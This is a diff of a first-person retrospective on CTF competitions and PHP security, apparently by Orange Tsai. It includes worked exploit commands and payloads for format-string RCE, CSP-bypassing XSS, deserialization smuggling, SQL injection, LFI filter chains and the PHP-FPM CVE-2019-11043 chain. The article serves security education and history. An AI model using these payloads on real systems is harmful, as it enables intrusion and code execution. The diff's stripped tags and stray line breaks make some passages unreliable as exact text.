@@ -46,11 +46,6 @@
  - Hats off to the CTF Community
 
 > References
-```
-
-
-
-```
 We all play different roles throughout our lives. I was fortunate enough
 to discover my passion early - and even luckier to make a living out of
 it. Before becoming a full-time hacker, I was also a script kiddie causing
@@ -59,11 +54,6 @@ higher bounties. And now, I can proudly call myself a "hacker." All these
 experiences - whether good or bad - have truly shaped who I am today, and
 this article shares one chapter of my life - the days when I was competing
 full-time in "hacking competitions!"
-```
-
-
-
-```
 Hi, I'm Orange Tsai. I guess many of you probably know me from my
 vulnerability research [1]. Maybe you've also heard my name mentioned as a
 Pwn2Own champion, a Pwnies Awards winner, or even spotted my bugs on the
@@ -72,11 +62,6 @@ Exchange Server, SSL VPNs, and most recently, Apache HTTP Server. I'm not
 really sure if this is something I should be proud of, but out of the top
 15 bugs hackers exploited most in 2021 [2], around 60% were discovered and
 reported by me... (sigh)
-```
-
-
-
-```
 It's been about 18 years since I first came across these so-called
 *hacking competitions*. Back then, those competitions - or Wargames, as we
 called them - weren't nearly as competitive as today's CTFs. Instead, they
@@ -108,11 +93,6 @@ clearly realized that, just by paying attention to a few more details,
 even someone like me could crack problems that the pros called impossible.
 This kind of "thinking outside the box" really had a huge impact on my
 life afterward!
-```
-
-
-
-```
 I've spent a huge part of my life playing these games, which we now call
 "CTF." For those unfamiliar with this term, here's a quick explanation:
 
@@ -154,11 +134,6 @@ DEFCON CTF [6]. They created an entirely new, middle-endian CPU
 instruction set and even *redefined a byte* as having 9 bits!
 
 => 9 bits per byte, stored in the middle-endian format!
-```
-
-
-
-```
 +-----Register (bit0 = MSB)-----+
  bit index ---> | b0..b8 | b9..b17 | b18..b26 |
  +---------+----------+-----------+
@@ -171,11 +146,6 @@ instruction set and even *redefined a byte* as having 9 bits!
  | YY | XX | ZZ | <- addr+0, +1, +2
  +---------+----------+-----------+
  b9..b17 b0..b8 b18..b26
-```
-
-
-
-```
 LegitBS released the emulator, debugging tools (and even a hardcover
 manual!) just one day before the competition. You can't imagine how
 shocked we were at the time! They spent two whole years designing a
@@ -203,11 +173,6 @@ competition, it's still somehow a reflection of the internet. I think
 these creative sparks between organizers and participants deserve to be
 remembered, instead of being lost in time. That's exactly why I want to
 take this opportunity - to make sure these incredible stories live on!
-```
-
-
-
-```
 I really love PHP! Especially back in those days, just knowing a little
 bit about it was enough to roam freely on the internet - somehow, its
 flaws made it feel flawless. Of course I know, doing this so-called
@@ -236,11 +201,6 @@ way, I've also revisited PHP's source code more times than I can count. I
 know there must be others who could talk about this better than me, but
 anyway, please let me take this special opportunity to fulfill one of my
 lifelong dreams!
-```
-
-
-
-```
 Next up, I'd like to talk about the sparks that fly between CTF and PHP!
 Whether it's those classic techniques that have inspired generations of
 CTF authors, or how the CTF community pushes the security boundary in its
@@ -250,11 +210,6 @@ Of course, no one can know every story out there. So, if anything's
 missing or inaccurately mentioned, I apologize in advance. Also, I'd love
 to hear more stories from you - I mean, the more we share these tales, the
 longer they'll live on :)
-```
-
-
-
-```
 We always want to stay at the cutting edge, but it's impossible to keep an
 eye on every single detail out there. That's exactly why CTF is such a
 perfect way to revisit those forgotten bugs.
@@ -274,11 +229,6 @@ allowing you to craft data structures that normally require multiple file
 uploads - by using just the single-upload mode! It wasn't until I came
 across this trick during a quick onsite CTF that I realized I'd totally
 missed out on such a cool bug!
-```
-
-
-
-```
 Since this is the first chapter, let me kick things off by sharing
 something from my own collection! Ever since the "Arbitrary Object
 Instantiation" first appeared in 2015 [16], I've been closely following
@@ -297,19 +247,9 @@ things down to a low-level language like C, you might even discover an
 entirely new way to break things open!
 
 => Arbitrary Objects? Choose Your Weapon!
-```
-
-
-
-```
 <?php
  $model = $_GET['model'];
  $object = new $model();
-```
-
-
-
-```
 I think the bug Andrew discovered [18] is an excellent example! This was a
 format-string vulnerability that popped up briefly in PHP 7.0.0. When PHP
 was making the big jump from 5.6 to 7.0, it introduced a brand-new
@@ -317,23 +257,14 @@ was making the big jump from 5.6 to 7.0, it introduced a brand-new
 mechanism couldn't handle. However, while integrating the existing
 exception-handling logic into this new interface, the developers
 accidentally brought along this vulnerability, too.
-```
-
-
-
-```
 +--------------------------+ +--------------------------+
 | Arbitrary Object Inst. | | PHP Bug #71105 |
 |--------------------------| |--------------------------|
 | <?php | | <?php | +==========+
 | $model = $_GET['mod']; | + | $name = "%n%n%n"; | = [ B O O M !]
-| $obj = new $model(); | | $name::doSomething(); | +==========+
+| $obj = new $model(); | | $name::
+doSomething(); | +==========+
 +--------------------------+ +--------------------------+
-```
-
-
-
-```
 When I first saw Andrew's report, it immediately hit me that this bug
 could perfectly combine with the previous attack, creating a fun
 combination - something I'd like to call "Format-String Oriented
@@ -342,62 +273,27 @@ Programming!"
 +--------------------[ One two three - pop that FSB!
 
 => [1] leak address through PHP errors
-```
-
-
-
-```
 $ curl "http://orange.local/index.php?model=%p-%p-%p"
 
  Fatal error: Uncaught Error: Class '0x23-0x7fffb61f3df0-0x7f1b12666000'
  not found in [...]
-```
-
-
-
-```
 => [2] move a heap pointer on stack to `GOT(free)-2`
-```
-
-
-
-```
 $ curl "http://orange.local/index.php?model=AAAAAAAAAAA \
  AAAAAAAA-%p-%p-%p-[...]-%p-%p-%p-%015373273d-%n"
 
  [...]
-```
-
-
-
-```
 => [3] partially overwrite `GOT[free]` to call `system()`
-```
-
-
-
-```
 $ curl "http://orange.local/index.php?model='|id&&exit; \
  AAAAAAAA-%p-%p-%p-[...]-%p-%p-%p-%0605504d-%n"
 
  [...]
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
-
-
-```
 Originally, this was just an idea collecting dust in my notes, waiting for
 the perfect moment to turn it into a challenge - but who knew ten years
 would fly by like that? Since the perfect timing never came, maybe this is
 the right place to write it down - I mean, it's not every day you get to
 see a classic format-string bug popping up in a scripting language. That's
 PHP for you!
-```
-
-
-
-```
 Ever since @alech and @zeri shocked everyone, demonstrating how you could
 take down almost every programming language through algorithmic complexity
 [19], PHP had no choice but to introduce the `max_input_vars` directive as
@@ -425,19 +321,9 @@ errors. But what if today, there's no code before setting response headers
 at all - can you still exploit it?
 
 ---------------------[ CSP: Content Security Policy
-```
-
-
-
-```
 <?php
 header("Content-Security-Policy: default-src 'none';");
 echo $_GET["xss"];
-```
-
-
-
-```
 Definitely! @pilvar cleverly exploited a side effect on `max_input_vars`
 [20] : when the number of parameters exceeds PHP's limit, PHP kindly
 throws a warning message at you. However, this warning indeed violates the
@@ -448,52 +334,28 @@ Scripting again!
 +---------------------[ CSP? Can't Stop Payloads!
 
 => [1] CSP says No!
-```
-
-
-
-```
 $ curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"
  HTTP/1.1 200 OK
  [...]
  Content-Security-Policy: default-src 'none';
 
  <svg/onload=alert(1)>
-```
-
-
-
-```
 => [2] We're free from CSP now!
-```
-
-
-
-```
 $ curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&A=3&A=4&...&A=999&A=1000"
  HTTP/1.1 200 OK
  [...]
 
- <b>Warning</b>: PHP Request Startup: Input variables exceeded 1000 [...]
- <br />
- <b>Warning</b>: Cannot modify header information - headers already sent
+ Warning: PHP Request Startup: Input variables exceeded 1000 [...]
+ 
+
+ Warning: Cannot modify header information - headers already sent
 
  <svg/onload=alert(1)>
-```
-
-
-
-```
 Honestly, I really love this kind of story - where security features end
 up making you less secure! And... Speaking of fixes for complexity attacks
 - there was one time when a patch accidentally upgraded the simple DoS
 issue into full-blown remote code execution. But that's a whole other fun
 story [21]!
-```
-
-
-
-```
 The entire Infosec community realized early on: once attackers control the
 `unserialize()` input, they can prefill an object and reuse dangerous
 Magic Methods to launch various attacks. However, as people gradually
@@ -511,11 +373,6 @@ back the classic Column Truncation Attack [23] with a Pile of Poo Emoji
 (U+1F4A9) [24], you can easily trigger a deserialization bug in WordPress!
 
 -----------------[ WordPress Unserialize ALL the Things!
-```
-
-
-
-```
 <?PHP
 function maybe_unserialize( $original ) {
  if ( is_serialized( $original ) ) // Looks serialized? Let's wake it up!
@@ -540,11 +397,6 @@ function is_serialized( $data, $strict = true ) {
  }
  return false;
 }
-```
-
-
-
-```
 As far as I remember, the first time I saw this pattern was back in 0CTF
 2016 [25]. The pattern leverages an extra step that applications perform
 on serialized strings - breaking the serialization format, causing the
@@ -554,40 +406,15 @@ interpreted as an entirely new - and malicious - object!
 +--------------------[ Serialize, Replace, Then Pwn!
 
 => [1] crafting the payload...
-```
-
-
-
-```
 <?PHP
 php > $user = 'orange';
 php > $pass = ';s:8:"password";O:4:"Evil":0:{}s:8:"realname";s:5:"pwned';
 php > $name = 'Orange Tsai' . str_repeat('..', 25);
 php > $obj = new User($user, $pass, $name);
 php > $data = serialize($obj);
-```
-
-
-
-```
 => [2] developers attempt to block path traversal :)
-```
-
-
-
-```
 php > $data = str_replace("..", "", $data);
-```
-
-
-
-```
 => [3] the length of `realname` field has been corrupted ;)
-```
-
-
-
-```
 <?PHP
 php > print_r($data);
  O:4:"User":3:{
@@ -600,28 +427,13 @@ php > print_r($data);
  ;s:8:"password";O:4:"Evil":0:{}
  s:8:"realname";s:5:"pwned";
  }
-```
-
-
-
-```
 => [4] We have smuggled our own *Evil* object!
-```
-
-
-
-```
 <?PHP
 php > print_r(unserialize($data));
  User Object (
  [realname] => pwned
  [password] => Evil Object ()
  )
-```
-
-
-
-```
 When it comes to classic examples of this pattern, we definitely can't
 skip the unexpected side effect WordPress introduced when it tried to
 harden its core class against the infamous "Double Preparing" problem
@@ -636,11 +448,6 @@ from misusing format strings like `%s`. This bad practice ultimately
 breaks the whole prepared statement, reviving SQL Injection once again!
 
 ----------------------[ Prepare Twice, Inject Once!
-```
-
-
-
-```
 <?PHP
 php > $value = "%1$%s OR 1=1--#";
 php > $clause = $wpdb->prepare(" AND value = %s", $value);
@@ -648,11 +455,6 @@ php > $query = $wpdb->prepare(
  "SELECT col FROM table WHERE key = %s $clause", $key);
 php > $wpdb->get_row($query);
  // SELECT col FROM table WHERE key='****' AND value = '****' OR 1=1--#'
-```
-
-
-
-```
 And to keep developers from stepping on this landmine, WordPress
 introduced a workaround - it temporarily replaces all formatting
 characters processed by `$wpdb->prepare()` with special placeholders, and
@@ -662,11 +464,6 @@ while constructing SQL queries. However, WordPress overlooked one special
 case - the query itself might also contain placeholders!
 
 => The WordPress Way: Hiding every single `%`!
-```
-
-
-
-```
 <?PHP
 public function prepare( $query, $args ) {
 
@@ -675,11 +472,6 @@ public function prepare( $query, $args ) {
  // [!!!] replace `%` with a *random* placeholder.
  return str_replace( '%', $this->placeholder_escape(), $query );
 }
-```
-
-
-
-```
 So when this mechanism is combined with the serialization process we
 mentioned earlier, developers could unintentionally create a "serialized
 string containing placeholders." This causes WordPress to mistakenly
@@ -702,11 +494,6 @@ also replaces these NULL bytes with special placeholders - giving
 attackers another chance to break the serialization format. I'm guessing
 this particular issue was probably the original inspiration behind that
 0CTF challenge we mentioned earlier!
-```
-
-
-
-```
 If we're really going to talk about deserialization problems from a
 defender's perspective, aside from minimizing entry points to
 `unserialize()`, it's even more important to strengthen commonly used
@@ -727,11 +514,6 @@ relying on it - eventually leading to a remote code execution
 vulnerability in SugarCRM!
 
 => How SugarCRM attempted to protect against deserialization attacks
-```
-
-
-
-```
 <?PHP
 public function __wakeup() {
  // clean all properties
@@ -740,11 +522,6 @@ public function __wakeup() {
  }
  throw new Exception("Not a serializable object");
 }
-```
-
-
-
-```
 Around 2017, we also started seeing various CTF challenges that aimed to
 bypass the `__wakeup()` method. However, most were still based on
 scenarios where different objects shared the same context - participants
@@ -755,11 +532,6 @@ Axe at WCTF 2019: by pointing dangerous properties elsewhere, he neatly
 bypassed the property-cleanup operations in `__wakeup()`. The same idea
 was later adopted into Laravel's POP chains [31], becoming yet another
 classic deserialization!
-```
-
-
-
-```
 We've talked about plenty of deserialization issues so far, but how much
 damage they can actually cause still depends heavily on whether the
 application has any vulnerable classes or not. Of course, projects like
@@ -805,11 +577,6 @@ year. We'll dive into this brand-new technique shortly in the upcoming
 section, "New Attacks and Techniques Born in CTFs".
 
  [ -- Spoiler Alert: it's our all-time friend, LFI... and more! ;) ]
-```
-
-
-
-```
 One thing I really love about Web Security is that, even though each
 individual trick seems pretty simple, the real challenge lies in figuring
 out how to chain them together. Especially nowadays, behind every
@@ -830,11 +597,6 @@ legendary in my book!
 
 But let's put those aside for now - and start with everyone's favorite
 classic: Windows!
-```
-
-
-
-```
 If we're really talking about the most notorious issue when running PHP on
 Windows, I'd say it's definitely how Windows handles file paths! My
 earliest memories of this topic probably come from the classic articles by
@@ -852,11 +614,6 @@ like backup files, session names, and even the admin portal - by simply
 checking whether certain paths exist or not!
 
 --------------------[ Brute-forcing the SESSION Path
-```
-
-
-
-```
 Base URL: http://phpcms/api.php?op=creatimg&txt=1337&font=*PATH*
  |
  v
@@ -887,11 +644,6 @@ $ curl "${URL}&font=../../../../../../../../xampp/tmp/sess_CB<" # [OK]
  [...]
 
 $ curl "${URL}&font=[...]/tmp/sess_CBHRVOFTMP41BIOV02VPSGSUP7" # [OK]
-```
-
-
-
-```
 Also, Alternate Data Streams (ADS) on NTFS is another feature hackers love
 to abuse. A classic trick is using a special stream to turn "arbitrary
 file writes" into "arbitrary directory creation" [45]. One particularly
@@ -899,11 +651,6 @@ memorable combo is leveraging this trick to create the missing
 `@@plugin_dir` directory, thereby reviving the MySQL UDF attack chain!
 
 ---------------------[ Revive the MySQL UDF Attack!
-```
-
-
-
-```
 C:\Users\Orange> ver
  Microsoft Windows [Version 10.0.19042.631]
 
@@ -917,22 +664,12 @@ C:\MySQL\lib> mysql -uroot -e
 C:\MySQL\lib> dir plugin
  04/21/2025 06:21 PM <DIR> .
  04/21/2025 06:21 PM <DIR> ..
-```
-
-
-
-```
 Given that most of these quirky behaviors come from Microsoft's attempts
 to maintain backward compatibility, websites running on Windows
 essentially start in hard mode. Even WorstFit Attack [46] that @splitline
 and I published last year stemmed from the technical debt that Windows has
 carried for over twenty years - all just to support legacy ANSI encoding -
 but we'll dive deeper into that later!
-```
-
-
-
-```
 Although we've talked plenty about Windows' weird behaviors, I guess if
 you choose Microsoft, you'll just have to live with it. However, what's
 even more surprising is that sometimes even Windows' built-in antivirus
@@ -987,40 +724,22 @@ oracle to reveal the file content!
  Windows Defender *angry*! ;)
 
 => [1] Defender detects the EICAR string
-```
-
-
-
-```
 $ cat eicar.com
  EICAR-STANDARD-ANTIVIRUS-TEST-FILE!
 
 $ ./mpclient eicar.com
  [...]
- EngineScanCallback(): Threat Virus:DOS/EICAR_Test_File identified.
-```
-
-
-
-```
+ EngineScanCallback(): Threat Virus:
+DOS/EICAR_Test_File identified.
 => [2] Defender kindly *emulates* your file as JScript
-```
-
-
-
-```
 $ cat sample.txt
  var mal = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
  eval(mal + "!")
 
 $ ./mpclient sample.txt
  [...]
- EngineScanCallback(): Threat Virus:DOS/EICAR_Test_File identified.
-```
-
-
-
-```
+ EngineScanCallback(): Threat Virus:
+DOS/EICAR_Test_File identified.
 So, let's say you can store a secret in the SESSION file, but there's no
 way to read it directly. Crafting the following structure gives you the
 ability to check whether the first character of the secret is an `A`: if
@@ -1029,11 +748,6 @@ is super creative - and in some ways, it's a perfect example of how CTF
 helps push the boundaries of cybersecurity!
 
 => Defender *emulates* the JavaScript inside
-```
-
-
-
-```
 +--------------------------------------------------------------+
 | Crafted HTML File |
 |--------------------------------------------------------------|
@@ -1047,17 +761,12 @@ helps push the boundaries of cybersecurity!
 | +----------------------------------------------------------+ |
 | |
 | +----------------------------------------------------------+ |
-| | <body> | |
+| |  | |
 | | [ Leaked Secret / Sensitive Data ] | |
-| | </body> | |
+| |  | |
 | +----------------------------------------------------------+ |
 | |
 +--------------------------------------------------------------+
-```
-
-
-
-```
 We've already talked about tons of PHP-related tricks, but honestly, most
 of them didn't originally come from CTFs. On the other hand, we've
 introduced brand-new attacks born in CTFs - but again, they weren't
@@ -1067,29 +776,14 @@ both totally PHP-specific and originated from CTFs?
 I think this chapter perfectly captures where these two worlds intersect.
 Let's see how the CTF community pushes technology forward in a unique way,
 breathing new life into the following attack surfaces!
-```
-
-
-
-```
 "How can a simple LFI be turned into RCE?" This question has bothered the
 web security community for almost twenty years, and I think we'd all agree
 - solving this long-standing problem is probably one of CTF's greatest
 contributions to PHP security!
 
 --------------------------[ LFI Never Gets Old
-```
-
-
-
-```
 <?php
  include( $_GET['page'] );
-```
-
-
-
-```
 Looking back at the twenty-year journey from LFI to RCE, I think we can
 generally divide it into two approaches:
 
@@ -1148,19 +842,9 @@ rather than stacking tedious tasks just to annoy participants. And that's
 how "One Line PHP" was born:
 
 ------------------------[ One Line PHP Challenge
-```
-
-
-
-```
 <?php
  ($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ?
  include($_) : highlight_file(__FILE__);
-```
-
-
-
-```
 The whole idea behind the challenge came from a small upload-progress
 feature that @Ryat mentioned in the comment of his SESSION Data Injection
 report [55]. Inspired by that trick, I decided to blend it to LFI -
@@ -1173,11 +857,6 @@ drawing over 1800 teams worldwide, yet only three teams managed to crack
 it. The challenge then also sparked a whole new trend to find more generic
 ways to leave temporary files behind, and inspired numerous later CTF
 challenges, including:
-```
-
-
-
-```
 - 2018/12 - The Return of One Line PHP Challenge (RealWorld CTF Final)
  => [ By the way, I was sitting right there as a finalist, [56]
  watching (the return of) my challenge go live on stage! ]
@@ -1185,11 +864,6 @@ challenges, including:
  - 2021/07 - 1linephp (0CTF/TCTF) [58]
  - 2021/10 - 2linephp (Balsn CTF) [59]
  - 2021/12 - Includer's Revenge (hxp CTF) [60]
-```
-
-
-
-```
 If you're interested in the technical details behind them, I highly
 recommend checking out the article "One Line PHP: From Genesis to
 Ragnarok" [61], by @Ginoah and @Bookgin!
@@ -1224,22 +898,19 @@ His idea mainly built around two PHP filters:
 By applying these two filters along with various encoding combinations, he
 was ultimately able to insert arbitrary content at the very beginning of a
 file - such as, prepending a letter `C`:
-```
-
-
-
-```
 +-------------------------------------------+
 | [Stage 1] Original File Content |
 +-------------------------------------------+
-| root:x:0:0:root:/root:/bin/bash [...] |
+| root:x:0:0:
+root:/root:/bin/bash [...] |
 +---------------------+---------------------+
  | Prepend Charset Header
  v
 +-------------------------------------------+
 | [Stage 2] convert.iconv.UTF8.CSISO2022KR |
 +-------------------------------------------+
-| \x1B$)Croot:x:0:0:root:/root:/bin/bash |
+| \x1B$)Croot:x:0:0:
+root:/root:/bin/bash |
 +---------------------+---------------------+
  | Remove invalid Base64 chars
  v
@@ -1255,11 +926,6 @@ file - such as, prepending a letter `C`:
 +-------------------------------------------+
 | *C*rootx00root/root/bin/bash [...] |
 +-------------------------------------------+
-```
-
-
-
-```
 Once @loknop fired the opening shot, the Infosec community started
 actively filling in the remaining puzzle. First, @wupco quickly compiled a
 complete Base64 mapping table [64]; then @remsio took a step further,
@@ -1283,17 +949,7 @@ enough, @hashkitten quickly took filter chains to another whole new level.
 He created what might be the shortest PHP challenge ever:
 
 -----------------------------[ minimal-php
-```
-
-
-
-```
 <?php file($_POST[0]);
-```
-
-
-
-```
 At first glance, you might think it's just a typical Arbitrary File Read
 (AFR). But the real twist here was figuring out how to exploit it with no
 output at all. Unsurprisingly, nobody managed to solve this challenge
@@ -1322,11 +978,6 @@ hexadecimal range or not!
 +---------------------[ Use PHP Error as an Oracle!
 
 => [1] Preparing the Oracle filter chains...
-```
-
-
-
-```
 $ cat check-first-char-is-hex.php
  <?php
  file(implode('|', [
@@ -1342,38 +993,13 @@ $ cat check-first-char-is-hex.php
  // [*] append the target
  'convert.iconv.L1.UCS-4LE/resource=' . $argv[1]
  ]));
-```
-
-
-
-```
 => [2] the first byte of `passwd` is not in hexdigits
-```
-
-
-
-```
 $ php check-first-char-is-hex.php /etc/passwd
  PHP Fatal error: Allowed memory size of 134217728 bytes exhausted
  (tried to allocate 94371840 bytes) in [...]
-```
-
-
-
-```
 => [3] no error means the first byte of `hostname` is in hexdigits
-```
-
-
-
-```
 $ php check-first-char-is-hex.php /etc/hostname && echo ok
  ok
-```
-
-
-
-```
 Once the general idea took shape, the next step was building a complete
 character-mapping table and iterating through the entire file byte by
 byte. This process involved even more sophisticated filter tricks - such
@@ -1407,11 +1033,6 @@ file contents, to CTF players exploring generic methods to leave temporary
 files behind, and finally to @loknop and @hashkitten shifting everyone's
 attention back to PHP filters - this must be a truly epic journey, shaped
 by the CTF, PHP, and Infosec communities all together!
-```
-
-
-
-```
 As more and more people realized how dangerous deserialization could be,
 developers became super cautious with `unserialize()`, causing such issues
 to gradually fade away. But what if today, we could break the assumption
@@ -1441,24 +1062,14 @@ But anyway - please allow me to include "PHAR Deserialization" in this
 section as well, and share the story!
 
 => I'd almost forgotten about this IRC log [75] XD
-```
-
-
-
-```
-[13:14] <Beched> omg is this common knowledge? =)
-[13:14] <Beched> where did you learn that PHP deserializes metadata in phars?
-[13:14] <Beched> somehow no one knew that among us
+[13:14]  omg is this common knowledge? =)
+[13:14]  where did you learn that PHP deserializes metadata in phars?
+[13:14]  somehow no one knew that among us
 [13:27] <orange_> I read the PHP source code in my free time
 [13:27] <orange_> I think both tricks are not seen on the Internet
 [13:27] <orange_> That's why nobody solve it ! :(
-[13:38] <Beched> yeah that's cool
-[13:38] <Beched> turning arbitrary read into unserialize
-```
-
-
-
-```
+[13:38]  yeah that's cool
+[13:38]  turning arbitrary read into unserialize
 =============================
 | Level 0 - What is PHAR? |
 =============================
@@ -1475,17 +1086,7 @@ from earlier, but this time we'll change the function from "reading a
 file" to something even more restricted - checking if a file exists:
 
 => Try harder: Blind Arbitrary File-Check
-```
-
-
-
-```
 <?php file_exists( $_GET['file'] );
-```
-
-
-
-```
 At first glance, it might seem like filter chains could help again.
 However, since `file_exists()` literally only checks if a file exists
 without actually processing its content, you can't apply the previous
@@ -1515,17 +1116,7 @@ file operations on image URLs as well - meaning attackers can easily reuse
 the same technique to trigger PHAR deserialization:
 
 ----------------------------[ So PHAR so Good!
-```
 
-
-
-```
-<img src="phar://path/to/image.jpg" />
-```
-
-
-
-```
 The issue was first discovered [76] back in 2019 and promptly got patched.
 However, @Cyku quickly found another way to trigger the vulnerability and
 provided a full exploit [77] based on a real-world scenario! He also
@@ -1535,21 +1126,9 @@ filenames, he was able to smuggle a crafted PHAR file - then combine it
 with Laravel's built-in POP chains - to finally achieve RCE!
 
 ------------------------[ Exploit mPDF All in One!
-```
 
 
-
-```
-<style>
- background: url(data:image/jpeg;base64,HERE-IS-PHAR-PAYLOAD-IN-BASE64);
- </style>
-
- <img src="#" ORIG_SRC="phar:///tmp/mpdf/_tempCSSidata42_0.jpeg/a.jpg"/>
-```
-
-
-
-```
+ 
 The entire PHAR mechanism really opened up a whole new era of PHP
 deserialization attacks. As more researchers got involved, this attack
 surface gradually expanded to cover more applications, libraries, and even
@@ -1558,11 +1137,6 @@ deserialization in the PHAR protocol starting from PHP 8.0 [78]. I'm sure
 that was fantastic news for both Thomas and me - because it meant that our
 "security research" actually did something positive in the real world, and
 made PHP a little bit safer! :)
-```
-
-
-
-```
 When we talk about "an awesome CTF," I'm not sure which name immediately
 pops into your mind. In my opinion, while high-quality challenges and
 experienced organizers are important, it's the participants themselves who
@@ -1585,11 +1159,6 @@ to it!
 
 So, in this section, let me introduce two classic examples that you
 shouldn't miss when talking about PHP 0days born in CTFs!
-```
-
-
-
-```
 Whenever I talk to people outside the Infosec community about hacking
 competitions, they often jokingly say, "Come on, real hackers wouldn't
 follow the rules - they'd just hack and change their scores, right?" Well,
@@ -1619,41 +1188,21 @@ infrastructure at the time - put an Easter egg right on its homepage
 acknowledge this vulnerability, too!
 
 ----------------------[ Easter Egg on facebook.com!
-```
-
-
-
-```
 $ curl https://www.facebook.com/?-s
  <?php
  include_once 'https://www.facebook.com/careers/department?dept=engineering&req=a2KA0000000Lt8LMAS';
-```
-
-
-
-```
 This vulnerability was eventually patched and assigned CVE-2012-1823. The
 PHP team solved this issue by checking that the query string can't start
 with a hyphen `-` (0x2D). This fix kept PHP safe for about 12 years -
 until I broke it again last year.
 
 => The patch of CVE-2012-1823: PHP-CGI Argument Injection
-```
-
-
-
-```
 if((qs = getenv("QUERY_STRING")) != NULL && strchr(qs, '=') == NULL) {
  /* ... omitted ... */
  for (p = decoded_qs; *p && *p <= ' '; p++) {/* skip leading spaces */}
  if (*p == '-') {
  skip_getopt = 1;
  }
-```
-
-
-
-```
 While revisiting PHP's source code, I found that by leveraging the Windows
 "BestFit" feature, I could completely bypass this fix. "BestFit" is
 basically a backward-compatibility feature introduced by Windows. It tries
@@ -1664,11 +1213,6 @@ use the infinity symbol `∞` (U+221E) to represent the digit `8` (U+0038)
 right on the command line:
 
 => Microsoft maps the characters to their "lookalikes"
-```
-
-
-
-```
 C:\Users\Orange> type Hello.c
  int main(int argc, char* argv[], char* envp[]) {
  printf("Hello %s!\n", argv[1]);
@@ -1684,11 +1228,6 @@ C:\Users\Orange> Hello.exe World
 
 C:\Users\Orange> Hello.exe √π⁷≤∞
  Hello vp7=8!
-```
-
-
-
-```
 So, by simply replacing the originally blocked hyphen (0x2D) with a "soft
 hyphen" (0xAD), the original attack could be revived effortlessly! This
 bypass affects practically every PHP version running on Windows - even a
@@ -1701,11 +1240,6 @@ I think this bypass also echoes what we mentioned earlier about
 "cross-application" - security is never confined to just one dimension.
 Sometimes, shifting your perspective a bit can magically turn those
 seemingly rock-solid protections into just a piece of cake! ;)
-```
-
-
-
-```
 For a long time, CTFs have carried a kind of *original sin* - being
 criticized for putting too much emphasis on tricky techniques. As the
 technical bar kept rising, some challenges grew a bit overly contrived,
@@ -1723,21 +1257,11 @@ he found that if the URL contained a newline, the server would
 unexpectedly respond with additional internal information.
 
 --------------------------[ PHP-FPM is Bleeding?
-```
-
-
-
-```
 $ curl http://orange.local/test.php/AAAAAAAAA
  string(10) "/AAAAAAAAA"
 
 $ curl http://orange.local/test.php/AAAAA%0AB
  string(7) "TH_INFO" <= WTF!?
-```
-
-
-
-```
 Although @d90pwn didn't manage to crack this challenge during the
 competition, his post-event analysis (along with @neex and @beched)
 unexpectedly exposed a serious vulnerability in PHP-FPM. The entire issue
@@ -1750,11 +1274,6 @@ before its intended buffer - allowing attackers to eventually write a zero
 to that location!
 
 => CVE-2019-11043: A Buffer Underflow leads to a single NULL-byte write!
-```
-
-
-
-```
 char *env_path_info = FCGI_GETENV(request, "PATH_INFO");
 int pilen = env_path_info ? strlen(env_path_info) : 0;
 
@@ -1767,11 +1286,6 @@ if (apache_was_here) {
 
 old = path_info[0];
 path_info[0] = 0; // <--- [2] single NULL-byte write!
-```
-
-
-
-```
 But how could a single NULL-byte write lead to an RCE? Here's the
 ingenious part: @neex skillfully abused PHP-FPM's memory allocation for
 CGI variables. By overwriting the LSB (least significant bit) of the `pos`
@@ -1782,30 +1296,16 @@ RCE without any memory read/write primitives at all!
 
 +---------------------[ Exploit PHP-FPM Like a Boss!
 => [1] a minified payload to trigger the NULL-byte write!
-```
-
-
-
-```
 $ curl http://orange.local/index.php/%0A$(printf %032d)?$(printf %01759d)
 
 [...Switching to GDB]
 
-Breakpoint 1, init_request_info () at ./sapi/fpm/fpm/fpm_main.c:1222
+Breakpoint 1, init_request_info () at ./sapi/fpm/fpm/fpm_main.c:
+1222
  1222 path_info[0] = 0;
  1: /x path_info = 0x55a371abfd60
  2: /x request.env.data = 0x55a371abfd60
-```
-
-
-
-```
 => [2] the structure *BEFORE* the write
-```
-
-
-
-```
 (gdb) p *request.env.data
 
  $1 = {
@@ -1814,56 +1314,21 @@ Breakpoint 1, init_request_info () at ./sapi/fpm/fpm/fpm_main.c:1222
  next = 0x55a371abe5b0,
  data = ""
  }
-```
-
-
-
-```
 => [3] let's write!
-```
-
-
-
-```
 (gdb) next
 
  [...]
-```
-
-
-
-```
 => [4] the `pos` *AFTER* the write
-```
-
-
-
-```
 (gdb) p *request.env.data.pos
 
  $2 = 0x55a371abf700
-```
-
-
-
-```
 => [5] let's kick off the real payload
-```
-
-
-
-```
 $ curl "http://orange.local/index.php/PHP_VALUE%0Aerror_log=/tmp/a;;;;[..]"
 $ curl "http://orange.local/index.php/PHP_VALUE%0Ainclude_path=/tmp;;;[..]"
 $ curl "http://orange.local/index.php/PHP_VALUE%0Aauto_prepend_file=a;[..]"
  [...]
 $ curl "http://orange.local/index.php?a=id"
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
-
-
-```
 The entire exploit [83] was incredibly neat and packed with details.
 Looking back through PHP's history, it's extremely rare to find RCE cases
 without any dangerous PHP functions at all - making this another true
@@ -1876,11 +1341,6 @@ harder for tools like ASAN to detect. Without something like the CTF scene
 - where groups of hackers intensively examine a minor feature through
 trial and error - it's hard to imagine how long this bug might have stayed
 hidden!
-```
-
-
-
-```
 Honestly, tackling such a huge topic was incredibly challenging -
 especially deciding what to cover and worrying whether I'd missed even
 cooler stories. Every time I revisited a finished section, I still felt
@@ -1904,11 +1364,6 @@ Everyone brings their own life experiences, and writing with complete
 objectivity just isn't possible. But within the limited time and space,
 I've tried my best to capture my own "flavor," and highlight the stories
 that I believe deserve to be passed on!
-```
-
-
-
-```
 Of course, there are still lots of brilliant PHP techniques that I
 couldn't squeeze into this article, so let me at least quickly give them a
 *shout-out* here!
@@ -1934,11 +1389,6 @@ couldn't squeeze into this article, so let me at least quickly give them a
  like abusing `ini_set()` [92] or `imap_open()` [93].
 
  - And of course, so much more...
-```
-
-
-
-```
 From its beginnings as a kind of subculture, to having thousands of
 competitions worldwide, and even one-vs-one livestream battles [94] today,
 CTF has undoubtedly become something pretty cool for many young hackers.
@@ -1966,11 +1416,6 @@ adventures! :)
 
 Also, hats off to those who've shared all the ups and downs throughout my
 CTF journey - cheers to HITCON CTF and to 217!
